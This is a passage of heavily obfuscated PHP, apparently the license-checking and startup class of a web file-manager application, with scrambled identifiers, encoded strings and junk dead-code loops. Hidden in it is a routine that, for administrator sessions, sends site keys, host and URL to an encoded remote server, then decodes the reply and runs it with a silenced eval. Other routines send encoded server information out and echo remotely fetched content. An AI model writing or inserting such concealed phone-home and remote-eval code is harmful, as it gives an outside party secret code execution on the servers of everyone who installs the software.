$GLOBALS[$恨[13]][$恨[14]] = explode($恨[19], $򏗙); $GLOBALS[$恨[13]][$恨[15]] = implode($恨[0], $GLOBALS[$恨[13]][$恨[14]]); $։ = $騣[721]; if (strlen($։) < $騣[713]) { die; } } public function run() { $힣 =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $this->usji257bf8e3(); $this->gpoze8c1edf5(); $쑭 = $힣[722]; if (!$쑭) { return; } $ڙ = $GLOBALS[$[13]][$[14]]; $Ќ = $힣[723]; if (strlen($Ќ) < $힣[724]) { return; } $ = $GLOBALS[$[13]][$[15]]; $ = $힣[725]; if (strlen($) < $힣[724]) { die; } define($[20], isset($ڙ[0]) && $ڙ[0] ? $ڙ[0] : $this->defaultModule); define($[21], isset($ڙ[1]) && $ڙ[0] ? $ڙ[1] : $this->defaultController); $ = $힣[726]; define($[22], isset($ڙ[2]) && $ڙ[0] ? $ڙ[2] : $this->defaultAction); $܈ = $힣[727]; if (strlen($܈) < $힣[715]) { die; } define($[23], MOD . $[0] . ST . $[0] . ACT); $_SERVER[$[24]] = strtolower(ACTION); $ј = $힣[728]; $this->autorun(); $㨲 = $힣[729]; if (count($ڙ) >= 3) { $this->appRun($); } else { $this->appRun(ACTION); } } private $bertaa701572 = array(); private $pbow0ea601ef = ''; public function ydbid026ea42() { $⯿ =& $_SERVER[ܮ]; $Җ =& $_SERVER[Ĵ]; $this->tjai485ba871(); $׿ = $⯿[730]; while (strlen($׿) < $⯿[724]) { if (!$׿) { break; } $׿++; } $this->tpnb35f17f49(); $this->nqawe6daad77(); $this->oyrn91bc14b1(); $this->lazcf00ed49a(); $Ň = $⯿[731]; if (strlen($Ň) < $⯿[724]) { die; } $this->iuyv9d1135b7(); $ = $⯿[732]; if (strlen($) < $⯿[707]) { die; } $this->zjel9933cdc1(); $this->cveb8132e0c3($Җ[25], array($this, $Җ[26])); $ = $⯿[733]; if (!$) { return; } $this->cveb8132e0c3($Җ[27], array($this, $Җ[28])); $ = $⯿[734]; if (strlen($) < $⯿[715]) { die; } $this->cveb8132e0c3($Җ[29], array($this, $Җ[30])); $this->cveb8132e0c3($Җ[31], array($this, $Җ[32])); $ = $⯿[735]; } public function getVersionData() { $Ɗ =& $_SERVER[ܮ]; return $this->bertaa701572; $ = $Ɗ[736]; if (strlen($) < $Ɗ[707]) { die; } } public function gxusfb2f91de($) { $ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $뛃ݲ = Model($[33])->get(); $ې = $[737]; while (strlen($ې) < $[707]) { if (!$ې) { break; } $ې++; } $ = array($[34], $[35], $[36], $[37], $[38], $[39], $[40], $[41], $[42], $[43], $[44], $[45], $[46], $[47], $[48], $[49], $[50], $[51], $[52], $[53], $[54], $[55], $[56], $[57], $[58], $[59], $[60], $[61], $[62], $[63], $[64], $[65], $[66], $[67], $[68], $[69], $[70], $[71], $[72], $[73], $[74], $[75], $[76], $[77], $[78], $[79], $[80], $[81], $[82], $[83], $[84], $[85], $[86], $[87]); foreach ($ as $) { $ˡ = $GLOBALS[$[88]][$[89]][$]; $ӝ = $[738]; while (strlen($ӝ) < $[702]) { if (!$ӝ) { break; } $ӝ++; } if (isset($뛃ݲ[$])) { $ˡ = $뛃ݲ[$]; } $[$[90]][$[91]][$] = $ˡ; } $ْ = $[$[90]][$[91]][$[46]]; $ی = $[739]; unset($[$[90]][$[92]][$[93]]); $ = $[740]; if (strlen($) < $[713]) { return; } unset($[$[90]][$[92]][$[94]]); unset($[$[90]][$[91]][$[46]]); $ɔȺ = $[741]; unset($[$[90]][$[91]][$[95]]); $ = $[742]; if (!$) { return; } $[$[90]][$[91]][$[96]] = array($[97] => (int) $ْ[$[98]], $[99] => (int) _get($ْ, $[100], 0)); $ = $[743]; $ۢ䲁 = substr(md5($[101] . get_client_ip() . $뛃ݲ[$[102]]), 0, 15); $[$[103]][$[104]] = Mcrypt::encode(Session::sign(), $ۢ䲁, 3600 * 24); $ = $[744]; while ($ < $[707]) { if ($ >= 0) { break; } $++; } $[$[103]][$[105]] = Action($[106])->accessToken(); $־ = $[745]; if (!$־) { return; } $[$[103]][$[107]] = md5($_SERVER[$[108]] . $뛃ݲ[$[102]]); $[$[103]][$[109]] = base64_encode(serverInfo()); $ݱ = $[746]; while (strlen($ݱ) < $[713]) { if (!$ݱ) { break; } $ݱ++; } $[$[103]][$[110]] = $this->pbow0ea601ef; $ = $[747]; while ($ < $[713]) { if ($ >= 0) { break; } $++; } if ($뛃ݲ[$[110]] != $[111]) { $[$[103]][$[112]] = $뛃ݲ[$[112]]; $[$[103]][$[113]] = $뛃ݲ[$[113]]; $ = rand_string(10) . $this->pbow0ea601ef . rand_string(5); $[$[90]][$[114]][$[115]] = $this->ijla3913d066($, $[$[103]][$[107]]); } if ($this->pbow0ea601ef == $[111]) { $[$[90]][$[91]][$[96]][$[100]] = 0; } $[$[103]][$[116]] = $this->versionPluginFilter(); $[$[103]][$[117]] = _get($this->bertaa701572, $[118], $[6]); if (KodUser::isRoot() && $this->config[$[119]]) { $[$[103]][$[120]] = WEB_ROOT; } return $; } private function iuyv9d1135b7() { $ϟ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $ԁ = $_SERVER[$[24]] == $[121]; if ($_SERVER[$[24]] == $[122] && $_GET[$[123]] == $[124]) { $ԁ = !0; } if ($ԁ) { $ހ = array($[110] => $this->pbow0ea601ef, $[125] => $this->oghdb79ec2c1(), $[126] => Model($[127])->count()); if ($this->pbow0ea601ef != $[111]) { $ = _get($this->bertaa701572, $[128]); if ($) { $ހ[$[129]] = $; $ހ[$[130]] = strtotime(_get($this->bertaa701572, $[131])); $ހ[$[132]] = _get($this->bertaa701572, $[118]); } $Ը = Model($[33])->get($[133], $[6], !0); if (is_string($Ը) && substr($Ը, 0, 1) == $[134]) { $Ը = json_decode_force($Ը); } if (is_array($Ը) && $Ը[$[135]] && strstr($Ը[$[135]], $[136])) { $ = explode($[136], $Ը[$[135]]); $ހ[$[137]] = $[0]; } } $ހ = $this->pkro5032c3eb(json_encode($ހ), md5($[138])); $ƣ = array($[139] => $ހ); $ٲ = $ϟ[748]; while (strlen($ٲ) < $ϟ[702]) { if (!$ٲ) { break; } $ٲ++; } call_user_func(array($[140], $[141]), $ƣ); $ = $ϟ[749]; if (!$) { die; } } if ($this->pbow0ea601ef == $[111]) { return; } $݋ = array($[142], $[143], $[144], $[145], $[146], $[147]); $Ȟ䳔 = Model($[33])->get(); $ƣ = array($[148] => $Ȟ䳔[$[34]], $[149] => $Ȟ䳔[$[35]], $[150] => $[6]); $ = $ϟ[750]; if (!$) { return; } foreach ($݋ as $ɐ) { if (!isset($Ȟ䳔[$ɐ]) || !$Ȟ䳔[$ɐ]) { continue; } $ƣ[$ɐ] = $Ȟ䳔[$ɐ]; $ˠ = $ϟ[751]; if (strlen($ˠ) < $ϟ[713]) { die; } } call_user_func(array($[140], $[141]), $ƣ); $ = $ϟ[752]; if (!$) { return; } } private function oyrn91bc14b1() { $ほ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; if ($_SERVER[$[24]] != $[151]) { return; } if (!KodUser::isRoot()) { die; } $܍ = $GLOBALS[$[13]]; if (isset($܍[$[152]])) { $this->afvc53a92c3d(); die; } if (isset($܍[$[153]]) && isset($܍[$[153]]) == $[124]) { $܍[$[154]] = Model($[33])->get($[155]); } if (!isset($܍[$[154]]) || strlen($܍[$[154]]) != 16) { show_json($[156] . $܍[$[154]], !1); } $ = Model($[33])->get($[102]); $́ = md5($_SERVER[$[108]] . $); $ = $ほ[753]; while (strlen($) < $ほ[715]) { if (!$) { break; } $++; } $ = array($[154] => $܍[$[154]], $[157] => rand_string(16), $[158] => $[138], $[159] => $[160], $[161] => $_SERVER[$[162]], $[163] => $_SERVER[$[164]], $[165] => $_SERVER[$[166]], $[107] => $́, $[167] => Model($[33])->get($[133])); $ = $ほ[754]; if (isset($܍[$[153]]) && isset($܍[$[153]]) == $[124]) { $[$[153]] = md5($[$[154]] . $[168] . $[$[157]]); } if ($܍[$[169]] == $[170]) { $ = $this->pkro5032c3eb($́, $[171]); $˟ = $this->ijla3913d066(json_encode($), $́ . $[172], 3); $˟ = $˟ . $[173] . $_SERVER[$[162]]; $ = $this->mlizb45f4175($[174] . $ . $[175] . $˟, -1); show_json($, !0); } else { if ($܍[$[169]] == $[176]) { $ = substr(md5($[177] . $́), 12, 15) . $[178]; $˟ = $this->kpro76d76ca4(trim($܍[$[179]]), $, 2); $ɽ = json_decode($˟, !0); if (!is_array($ɽ) || !is_array($ɽ[$[180]]) || $ɽ[$[154]] != !0) { $ = $[181]; $Ճ = $ɽ[$[180]] ? $[182] . $ɽ[$[180]] : $; show_json($Ճ, !1); } else { $[$[157]] = $ɽ[$[180]][$[183]]; } } else { $ɽ = $this->mlizb45f4175($[184], $, 10); } } if (!is_array($ɽ) || !is_array($ɽ[$[180]]) || $ɽ[$[154]] != !0) { $ = LNG($[185]); $Ճ = $ɽ[$[180]] ? $[182] . $ɽ[$[180]] : $; show_json($Ճ, !1); } $֤ = $ɽ[$[180]]; $ = $this->btgqb011fe5f($֤[$[186]]); $ء = $ほ[755]; if (!$ || $ != $֤[$[131]]) { $ﯴ = array($[187] => Model($[33])->get($[102]), $[188] => $_SERVER[$[108]], $[189] => this_url(), $[163] => $_SERVER[$[164]]); $˟ = $this->jdtl86255f00(json_encode($ﯴ)); $this->mlizb45f4175($[190] . $˟); show_json(LNG($[191]), !0); } $ƾ = array($[155] => $֤[$[192]], $[193] => $֤[$[194]], $[195] => rand_string(16), $[110] => $֤[$[196]]); if ($[$[157]]) { $ƾ[$[195]] = $[$[157]]; } $锳ߔ = substr(md5($ƾ[$[193]]), 10, 10); $ܬ = $锳ߔ . $ƾ[$[110]] . $ƾ[$[195]]; $ƾ[$[112]] = strrev(base64_encode($this->pkro5032c3eb($ܬ, $[197]))); $ׂ = $ほ[756]; $ֈ = rand_string(16); $ = $ֈ . $ƾ[$[110]] . $this->pkro5032c3eb(md5($ƾ[$[155]]), $ֈ); $ƾ[$[113]] = base64_encode(strrev($this->pkro5032c3eb($, $[198]))); if ($֤[$[199]] && $֤[$[199]] >= 1) { Model($[33])->setDeep($[200], $[124]); } Model($[33])->set($ƾ); $ = md5($_SERVER[$[108]] . strrev($) . $ƾ[$[193]]); $ = $ほ[757]; if (strlen($) < $ほ[715]) { return; } $ԏ = strrev(substr($, 10, 16)); $¶֩ = $this->ijla3913d066(json_encode($֤), $); $ = $ほ[758]; $ = array_to_keyvalue(Model($[7])->listData(), $[201]); $ = $ほ[759]; $ = $[$[202]]; $֣ = $ほ[760]; if (strlen($֣) < $ほ[713]) { return; } $ж = array(); $ж[$ԏ] = $¶֩; Model($[7])->update($[$[203]], array($[204] => $ж)); $ᢀ = $ほ[761]; if (!$ᢀ) { die; } $this->bertaa701572 = $֤; $ = $ほ[762]; $this->pbow0ea601ef = $ƾ[$[110]]; $҉ = $ほ[763]; if (strlen($҉) < $ほ[702]) { return; } $this->licenseRegistSuccess(); Cache::set($[205] . md5($ . $[206]), $[6]); $ = $ほ[764]; if (!$) { return; } show_json(LNG($[191]), !0); } private function licenseRegistSuccess() { $ =& $_SERVER[ܮ]; $훁 =& $_SERVER[Ĵ]; $Ȣ = Model($훁[33])->get(); $ѓ = $[765]; if (strlen($ѓ) < $[713]) { return; } if ($Ȣ[$훁[63]] != $훁[124]) { Model($훁[33])->set($훁[63], $훁[124]); } Action($훁[207])->initStart(!0); } private function afvc53a92c3d() { $ǁ =& $_SERVER[Ĵ]; Model($ǁ[33])->set(array($ǁ[155] => $ǁ[6], $ǁ[193] => $ǁ[6], $ǁ[110] => $ǁ[111], $ǁ[112] => $ǁ[6], $ǁ[113] => $ǁ[6])); Model($ǁ[33])->setDeep($ǁ[200], $ǁ[208]); $this->bertaa701572 = array(); $this->pbow0ea601ef = $ǁ[111]; } private function tjai485ba871() { $ہ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $_SERVER[$[164]] = _get($_SERVER, $[164], APP_HOST); $Ŏ = $ہ[766]; if (!$Ŏ) { die; } $this->pbow0ea601ef = $[111]; $ꇟ = $ہ[767]; if (strlen($ꇟ) < $ہ[713]) { die; } $鐫 = Model($[33])->get(); $ = $ہ[768]; while ($ < $ہ[707]) { if ($ >= 0) { break; } $++; } if ($鐫[$[110]] == $[111]) { return; } $ɘ = Model($[33])->get($[102]); $ = $[205] . md5($ɘ . $[206]); $򻽎߱ = $ہ[769]; $֭ = Cache::get($); if (!is_array($֭) || !isset($֭[$[209]]) || time() - $֭[$[209]] >= 60) { $ڏ = Model($[7])->loadList(); $ = $ڏ[$[202]]; $ = md5($_SERVER[$[108]] . strrev($ɘ) . $鐫[$[193]]); $ԏ = strrev(substr($, 10, 16)); $֭ = $this->kpro76d76ca4($[$[88]][$ԏ], $); $֭ = json_decode($֭, !0); } if (!is_array($֭)) { return $this->afvc53a92c3d(); } $ = strtotime($֭[$[131]]); if (time() >= $) { return $this->afvc53a92c3d(); } if (!isset($֭[$[209]]) || time() - $֭[$[209]] > 20) { $֭[$[209]] = time(); Cache::set($, $֭); } $this->bertaa701572 = $֭; $this->pbow0ea601ef = $鐫[$[110]]; $GLOBALS[$[210]] = $this; } private function tpnb35f17f49() { $ƅ =& $_SERVER[Ĵ]; $ = $GLOBALS[$ƅ[13]]; $ܥ = $_SERVER[$ƅ[24]]; $ѵ = $_SERVER[ܮ][770]; if (!$ѵ) { return; } if ($ܥ == $ƅ[211] && $this->pbow0ea601ef == $ƅ[111]) { show_json(LNG($ƅ[212]), !1, $ƅ[213]); } $ڹ = array($ƅ[214], $ƅ[215]); if (in_array($ܥ, $ڹ)) { if ($this->pbow0ea601ef == $ƅ[111] && isset($[$ƅ[216]])) { show_json(LNG($ƅ[212]), !1, $ƅ[213]); die; } $ʙ = $this->oghdb79ec2c1(); if ($ʙ != intval($ƅ[217])) { if ($ʙ <= Model($ƅ[127])->count()) { show_json(LNG($ƅ[218]), !1, $ƅ[213]); die; } } } } private function nqawe6daad77() { $ʬ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $ = array($[121], $[122]); if (!KodUser::isRoot() || !isset($_GET[$[219]])) { return; } if (!in_array($_SERVER[$[24]], $)) { return; } $ǆɪ = $[220]; $ǆɪ = $this->lmwo084d3f18($ǆɪ, $[221]); $ڄ = stream_context_create(array($[222] => array($[223] => $[224], $[225] => 3))); $ = $ʬ[771]; while (strlen($) < $ʬ[713]) { if (!$) { break; } $++; } $ꍆ = @file_get_contents($ǆɪ, !1, $ڄ); $Ș = $ʬ[772]; if (strlen($Ș) < $ʬ[715]) { return; } header($[226]); $ύ = $ʬ[773]; if (!$ύ) { die; } if ($ꍆ && strstr($ꍆ, $[227])) { echo $ꍆ; } die; } public function ixav8f8e8725($) { $͵ =& $_SERVER[ܮ]; $Ƹ =& $_SERVER[Ĵ]; if ($this->pbow0ea601ef == $Ƹ[228]) { return $; } $ = $this->versionPluginList(); $ = $͵[774]; if (strlen($) < $͵[707]) { die; } $ = explode($Ƹ[229], $this->versionPluginFilter()); $݂ = $͵[775]; if (strlen($݂) < $͵[707]) { die; } $ = array(); foreach ($ as $ => $핥) { if ($핥 == $Ƹ[230] && substr($this->pbow0ea601ef, 0, 1) == $Ƹ[230]) { continue; } if (!in_array($, $)) { $[] = $; } } foreach ($ as $) { unset($[$]); } return $; $ = $͵[776]; while (strlen($) < $͵[702]) { if (!$) { break; } $++; } } private function versionPluginList() { $㒌 =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; return array($[231] => $[230], $[232] => $[230], $[233] => $[230], $[234] => $[230], $[235] => $[230], $[236] => $[230], $[237] => $[238], $[239] => $[238], $[240] => $[238], $[241] => $[238], $[242] => $[238], $[243] => $[238], $[244] => $[238], $[245] => $[238], $[246] => $[238], $[247] => $[238], $[248] => $[238], $[249] => $[238], $[250] => $[238]); $ = $㒌[777]; if (strlen($) < $㒌[713]) { die; } } private function versionPluginFilter() { $ =& $_SERVER[Ĵ]; if ($this->pbow0ea601ef == $[111]) { return $[6]; } $ = _get($this->bertaa701572, $[251], $[6]); $Æ = _get($this->bertaa701572, $[118], $[6]); $ = _get($this->bertaa701572, $[252], $[6]); if ($Æ > time() && $ > time()) { $ = explode($[229], $); $׷ֆ = array_keys($this->versionPluginList()); $ = array_merge($, $׷ֆ); $ = implode($[229], array_filter(array_unique($))); } return $; } private function zjel9933cdc1() { $ =& $_SERVER[Ĵ]; if ($this->pbow0ea601ef != $[111]) { $GLOBALS[$[88]][$[92]][$[253]] = $[208]; return; } $GLOBALS[$[88]][$[254]] = $[124]; if (Model($[255])->get($[63]) != $[208]) { Model($[255])->set($[63], $[208]); } } public function sqmhd93f0fd5() { $ =& $_SERVER[ܮ]; return $_SERVER[Ĵ][256]; $놸 = $[778]; while ($놸 < $[707]) { if ($놸 >= 0) { break; } $놸++; } } private function lazcf00ed49a() { $Ҟڝ =& $_SERVER[ܮ]; $ӹ =& $_SERVER[Ĵ]; $޳ = array($ӹ[257], $ӹ[258], $ӹ[259]); $㣁 = $Ҟڝ[779]; if (strlen($㣁) < $Ҟڝ[707]) { die; } $ = $ӹ[260] . md5($ӹ[261]); if ($this->pbow0ea601ef == $ӹ[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$ӹ[24]], $޳)) { return; } if (time() % 4 != 0) { return; } $ۦ = call_user_func(array($ӹ[262], $ӹ[263]), $); $ = $Ҟڝ[780]; if ($ۦ && time() - $ۦ < intval($ӹ[264])) { return; } call_user_func(array($ӹ[262], $ӹ[141]), $, time()); $ = Model($ӹ[33])->get($ӹ[102]); $ = $Ҟڝ[781]; if (!$) { return; } $ = array($ӹ[154] => Model($ӹ[33])->get($ӹ[155]), $ӹ[169] => $this->pbow0ea601ef, $ӹ[165] => $_SERVER[$ӹ[166]], $ӹ[167] => Model($ӹ[33])->get($ӹ[133]), $ӹ[107] => md5($_SERVER[$ӹ[108]] . $), $ӹ[158] => $ӹ[138], $ӹ[161] => $_SERVER[$ӹ[162]]); $ = $this->mlizb45f4175($ӹ[265], $); if (!is_array($)) { return; } if ($[$ӹ[154]] && $[$ӹ[266]]) { if ($this->btgqb011fe5f($[$ӹ[266]]) == $[$ӹ[154]]) { return; } } $this->afvc53a92c3d(); $ = $Ҟڝ[782]; if ($this->btgqb011fe5f($[$ӹ[266]]) != $[$ӹ[154]]) { $ = array($ӹ[187] => $, $ӹ[188] => $_SERVER[$ӹ[108]], $ӹ[189] => this_url(), $ӹ[163] => $_SERVER[$ӹ[164]]); $Ƶ = $this->jdtl86255f00(json_encode($)); $ = $this->mlizb45f4175($ӹ[190] . $Ƶ); if ($ && is_array($) && isset($[$ӹ[266]])) { $ = $this->kpro76d76ca4($[$ӹ[266]], 2); if ($) { $ = $this->btgqb011fe5f($); } if ($) { try { @eval($); } catch (Exception $) { } } } } } private function mlizb45f4175($ԙ = '', $ɵۥ = array(), $ැ = 5) { $Ԫ =& $_SERVER[ܮ]; $ֳ =& $_SERVER[Ĵ]; $ȓ = $ֳ[267]; $ȓ = $this->lmwo084d3f18($ȓ, $ֳ[268]); $ = $Ԫ[783]; $ȓ = $ȓ . $ԙ; if ($ɵۥ && is_array($ɵۥ)) { $ȓ = $ȓ . $ֳ[269] . http_build_query($ɵۥ); } if ($ɵۥ === -1) { return $ȓ; } $ = stream_context_create(array($ֳ[222] => array($ֳ[225] => $ැ, $ֳ[223] => $ֳ[270]), $ֳ[271] => array($ֳ[272] => !1, $ֳ[273] => !1))); $ɵۥ = @file_get_contents($ȓ, !1, $); return json_decode($ɵۥ, !0); $ = $Ԫ[784]; while (strlen($) < $Ԫ[707]) { if (!$) { break; } $++; } } private function oghdb79ec2c1() { $Ά =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; $Ĩ = array($[274] => $[275], $[276] => $[277], $[278] => $[279], $[280] => $[281], $[282] => $[283], $[284] => $[217], $[285] => $[217], $[286] => $[275], $[287] => $[277], $[288] => $[279], $[289] => $[290], $[291] => $[281], $[292] => $[293], $[294] => $[283], $[295] => $[296], $[297] => $[298], $[299] => $[300]); $Ɯ = $Ά[785]; while ($Ɯ < $Ά[707]) { if ($Ɯ >= 0) { break; } $Ɯ++; } $馠 = $Ĩ[$this->pbow0ea601ef]; $馠 = intval($馠 ? $馠 : $[275]); $Ā = _get($this->bertaa701572, $[301]); $ = $Ά[786]; $Ā = $Ā ? intval($Ā) : 0; return $馠 + $Ā; } public function blru5a1ba86f($ӱ) { $ې =& $_SERVER[Ĵ]; $⑽ = $this->oghdb79ec2c1(); if ($ӱ[$ې[302]] == $ې[124]) { return; } if ($⑽ >= intval($ې[217])) { return; } $ = Model($ې[127])->count(); if ($ <= $⑽) { return; } $׸汒 = Model($ې[127])->field($ې[302])->limit($⑽)->select(); $҈ԕ = $_SERVER[ܮ][787]; $׸汒 = array_to_keyvalue($׸汒, $ې[6], $ې[302]); if (!in_array($ӱ[$ې[302]], $׸汒)) { show_json($ې[303], !1, $ې[213]); } } public function uwgpccb3d88a() { $̨ =& $_SERVER[ܮ]; $ﺔ =& $_SERVER[Ĵ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ۺ = $ﺔ[220]; $ = $̨[788]; if (strlen($) < $̨[702]) { return; } $ۺ = $this->lmwo084d3f18($ۺ, $ﺔ[221]); $Ȭ = $̨[789]; if (!$Ȭ) { return; } $ = stream_context_create(array($ﺔ[222] => array($ﺔ[223] => $ﺔ[224], $ﺔ[225] => 3))); $ê = @file_get_contents($ۺ, !1, $); echo $ﺔ[304] . hash_encode($ê) . $ﺔ[305]; } private function ijla3913d066($ǯ, $ش, $ = 3) { $ո =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; usleep(1); $඾ = $ո[790]; while (strlen($඾) < $ո[707]) { if (!$඾) { break; } $඾++; } $ǯ = trim($ǯ); $ѡ = mt_rand(0, 5) . $[6]; $ş = $ո[791]; $ = rand_string(15); $ = $[306]; $ = $ո[792]; while ($ < $ո[713]) { if ($ >= 0) { break; } $++; } switch ($ѡ) { case $[208]: $Ɗ = $this->pkro5032c3eb($ǯ, strrev($ش . $)); break; $ = $ո[793]; if (!$) { die; } case $[124]: $Ɗ = $this->pkro5032c3eb($ǯ, strrev($ . $ش)); $𽄜 = $ո[794]; if (strlen($𽄜) < $ո[707]) { die; } break; $ߞۅ = $ո[795]; case $[307]: $Ɗ = $this->pkro5032c3eb($ǯ, base64_encode($ . $ش)); $Ӹ = $ո[796]; if (!$Ӹ) { die; } break; $Ě = $ո[797]; while (strlen($Ě) < $ո[707]) { if (!$Ě) { break; } $Ě++; } case $[308]: $Ɗ = $this->pkro5032c3eb($ǯ, md5($ . $ش)); break; $迭ڹ = $ո[798]; if (!$迭ڹ) { return; } case $[309]: $ǯ = base64_encode($ǯ); $壳 = $ո[799]; if (strlen($壳) < $ո[702]) { die; } $˨ = rand(0, 64); $ = $[$˨]; $ = $ո[800]; $ = md5($ . md5($ش . $) . $ش); $ԓ = $ո[801]; if (strlen($ԓ) < $ո[724]) { return; } $ = substr($, $˨ % 8, $˨ % 8 + 7); $ = $[6]; $䥺Џ = $ո[802]; $۟ = 0; $ֶ = 0; $ҝ = 0; for ($۟ = 0; $۟ < strlen($ǯ); $۟++) { $ҝ = $ҝ == strlen($) ? 0 : $ҝ; $ֶ = ($˨ + strpos($, $ǯ[$۟]) + ord($[$ҝ++])) % 64; $ .= $[$ֶ]; } $Ɗ = hash_encode($ . $); $㋤ = $ո[803]; if (!$㋤) { return; } break; default: $Ɗ = $this->pkro5032c3eb($ǯ, $ش . $); $ع = $ո[804]; while (strlen($ع) < $ո[724]) { if (!$ع) { break; } $ع++; } break; $ = $ո[805]; if (strlen($) < $ո[707]) { die; } } $Ɗ = strrev($ѡ . $ . $Ɗ); $ = $ո[806]; if ($ - 1 > 0) { $Ɗ = $this->ijla3913d066($Ɗ, $ش, $ - 1); } return $Ɗ; } private function kpro76d76ca4($秌Ͳ, $ޢ, $ = 3) { $̛ =& $_SERVER[ܮ]; $ =& $_SERVER[Ĵ]; if (!is_string($秌Ͳ) || strlen($秌Ͳ) < 10) { return !1; } $秌Ͳ = trim($秌Ͳ); $ = $̛[807]; $秌Ͳ = strrev($秌Ͳ); $ = $̛[808]; if (strlen($) < $̛[707]) { return; } $ = $秌Ͳ[0]; $ = substr($秌Ͳ, 1, 15); $秌Ͳ = substr($秌Ͳ, 16); $ = $̛[809]; if (strlen($) < $̛[702]) { return; } $埉 = $[306]; $ʬ = $̛[810]; if (strlen($ʬ) < $̛[713]) { return; } switch ($) { case $[208]: $ζ = $this->lmwo084d3f18($秌Ͳ, strrev($ޢ . $)); $ݩԜ = $̛[811]; while (strlen($ݩԜ) < $̛[724]) { if (!$ݩԜ) { break; } $ݩԜ++; } break; $қ = $̛[812]; if (strlen($қ) < $̛[715]) { die; } case $[124]: $ζ = $this->lmwo084d3f18($秌Ͳ, strrev($ . $ޢ)); $ = $̛[813]; while (strlen($) < $̛[707]) { if (!$) { break; } $++; } break; $ = $̛[814]; if (!$) { die; } case $[307]: $ζ = $this->lmwo084d3f18($秌Ͳ, base64_encode($ . $ޢ)); break; $ = $̛[815]; if (!$) { die; } case $[308]: $ζ = $this->lmwo084d3f18($秌Ͳ, md5($ . $ޢ)); $ = $̛[816]; while (strlen($) < $̛[702]) { if (!$) { break; } $++; } break; case $[309]: $秌Ͳ = hash_decode($秌Ͳ); $١ = $̛[817]; $ޞ = $秌Ͳ[0]; $秌Ͳ = substr($秌Ͳ, 1); $١풥 = $̛[818]; if (!$١풥) { die; } $´ī = strpos($埉, $ޞ); $Ѐ = md5($ޞ . md5($ޢ . $ޞ) . $ޢ); $鷾 = $̛[819]; if (strlen($鷾) < $̛[715]) { return; } $Ѐ = substr($Ѐ, $´ī % 8, $´ī % 8 + 7); $ = $[6]; $ = 0; $Ͱ = $̛[820]; while ($Ͱ < $̛[702]) { if ($Ͱ >= 0) { break; } $Ͱ++; } $ = 0; $⤹Ċ = 0; for ($ = 0; $ < strlen($秌Ͳ); $++) { $⤹Ċ = $⤹Ċ == strlen($Ѐ) ? 0 : $⤹Ċ; $ = $̛[821]; if (!$) { return; } $͘ = $⤹Ċ++; $ = strpos($埉, $秌Ͳ[$]) - $´ī - ord($Ѐ[$͘]); while ($ < 0) { $ += 64; } $ .= $埉[$]; } $ζ = base64_decode($); $ = $̛[822]; if (!$) { return; } break; $ = $̛[823]; while ($ < $̛[707]) { if ($ >= 0) { break; } $++; } default: $ζ = $this->lmwo084d3f18($秌Ͳ, $ޢ . $); break; } if ($ - 1 > 0) { $ζ = $this->kpro76d76ca4($ζ, $ޢ, $ - 1); } return $ζ; } public function jdtl86255f00($庬) { $ǉ =& $_SERVER[ܮ]; $ե =& $_SERVER[Ĵ]; $᯷ = $this->qlvb87d397ed(); $ǉ恶 = $ǉ[824]; $ = $this->qlvb87d397ed(); $߰ = ($᯷ - 1) * ($ - 1); $ = intval(($᯷ + $) / 2); while (1) { $ = $; $ = $ǉ[825]; if (!$) { die; } $ = $߰; while ($ % $ != 0) { $瘕 = $; $ґ = $ǉ[826]; if (!$ґ) { die; } $ = $; $߈ = $ǉ[827]; if (strlen($߈) < $ǉ[724]) { die; } $ = $瘕 % $; } if ($ == 1) { break; } else { $++; } } $ = 2; for ($܄ = 0; $܄ < $߰ * 10; $܄++) { if (($߰ * $܄ + 1) % $ == 0) { $ = intval(($߰ * $܄ + 1) / $); break; } } $ = $this->pkro5032c3eb($᯷ * $ . $ե[6], $ե[138]); $ = md5($ե[310] . ($᯷ + $) . $ե[311] . $ . $ե[311] . $ . $ե[312]); $金 = $ǉ[828]; if (!$金) { return; } $ޮ = $this->pkro5032c3eb($庬, $) . $ե[313] . $; $˦Ͻ = $ǉ[829]; if (strlen($˦Ͻ) < $ǉ[707]) { return; } return $ޮ; $ݕ = $ǉ[830]; while (strlen($ݕ) < $ǉ[724]) { if (!$ݕ) { break; } $ݕ++; } } public function btgqb011fe5f($˽) { $ =& $_SERVER[ܮ]; $沭 =& $_SERVER[Ĵ]; $ = explode($沭[313], $˽); if (count($) != 2) { return $沭[6]; } $԰ܵ = $this->lmwo084d3f18($[1] . $沭[6], $沭[138]); $ݓ = $[831]; while ($ݓ < $[702]) { if ($ݓ >= 0) { break; } $ݓ++; } if (!$԰ܵ) { return $沭[6]; } $԰ܵ = intval($԰ܵ); $ = 0; $ء = $[832]; while (strlen($ء) < $[713]) { if (!$ء) { break; } $ء++; } $廄 = 0; $ = $[833]; if (strlen($) < $[715]) { die; } for ($ȝ = 3; $ȝ < $԰ܵ; $ȝ += 2) { if ($԰ܵ % $ȝ != 0) { continue; } $ = $ȝ; $˴ = $[834]; while ($˴ < $[724]) { if ($˴ >= 0) { break; } $˴++; } $廄 = intval($԰ܵ / $ȝ); break; } $ئ = ($ - 1) * ($廄 - 1); $޵ = $[835]; while (strlen($޵) < $[713]) { if (!$޵) { break; } $޵++; } $ꁆۉ = intval(($ + $廄) / 2); $ܑ = $[836]; while (1) { $ű = $ꁆۉ; $ = $ئ; while ($ % $ű != 0) { $꿃 = $; $ = $ű; $ű = $꿃 % $ű; } if ($ű == 1) { break; } else { $ꁆۉ++; } } $㌿ = 2; $ = $[837]; while (strlen($) < $[715]) { if (!$) { break; } $++; } for ($ȝ = 0; $ȝ < $ئ * 10; $ȝ++) { if (($ئ * $ȝ + 1) % $ꁆۉ == 0) { $㌿ = intval(($ئ * $ȝ + 1) / $ꁆۉ); break; } } $Ő = md5($沭[310] . ($ + $廄) . $沭[311] . $ꁆۉ . $沭[311] . $㌿ . $沭[312]); $Ճ = $this->lmwo084d3f18($[0], $Ő); $Ň = $[838]; while (strlen($Ň) < 